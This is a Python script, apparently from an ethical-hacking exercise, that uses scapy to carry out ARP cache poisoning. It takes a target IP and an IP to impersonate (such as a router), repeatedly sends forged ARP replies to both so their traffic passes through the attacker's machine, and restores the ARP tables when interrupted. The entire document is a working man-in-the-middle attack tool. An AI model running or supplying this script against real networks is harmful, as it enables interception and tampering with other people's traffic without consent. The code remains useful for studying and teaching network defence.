import scapy.all as scapy
import time 
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest = 'targetIP', help = 'Enter target IP you want to poison')
    parser.add_argument('-s', '--spoof', dest = 'spoofIP', help = 'Enter IP you want to pretend to be such as router')
    options = parser.parse_args()
    if not options.targetIP:
        print('[*] Please specify a target IP!')
    if not options.spoofIP:
        print('[*] Please enter an IP to be spoofed.')
    return options.targetIP, options.spoofIP 


def getmac(ip):
    arp_request = scapy.ARP(pdst = ip) #creating arp packet
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") #Creating Frame setting dst address 
    arp_broadcast = broadcast/arp_request #Appending Frame and Arp together (scapy functionall)
    answerList = scapy.srp(arp_broadcast, timeout = 1, verbose = False)[0] #Allows us to send packets returns two items in a list [0] to only extract responses that had answers 

    return answerList[0][1].hwsrc
     

def poison(target_ip, spoof_ip):
    targetmac = getmac(target_ip)
    #                Arp (Response)   Target Machine    Target Mac  Forging Source of packet 
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = targetmac, psrc = spoof_ip) #Automatically uses my mac for the spoofed IP. 
    scapy.send(packet, verbose = False) 

def restoreArp(destIP, spoofIP):
    destmac = getmac(destIP)
    sourcemac = getmac(spoofIP)
    restorePacket = scapy.ARP(op = 2, pdst = destIP, hwdst = destmac, psrc = spoofIP, hwsrc = sourcemac)
    scapy.send(restorePacket, count = 4, verbose = False) #Sends packet 4 times




targetIP, spoofIP, = get_args() #Gets user input from cmdline and stores in values 

try:
    packet_coutner = 0 
    while True:
        poison(targetIP, spoofIP)
        poison(spoofIP, targetIP)
        packet_coutner = packet_coutner + 2 
        print("\r[*] Packets Sent:", packet_coutner, end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("\n\n[!] Detected Ctr-C.......\n[*] Restoring Arp Tables! ")
    restoreArp(targetIP, spoofIP)
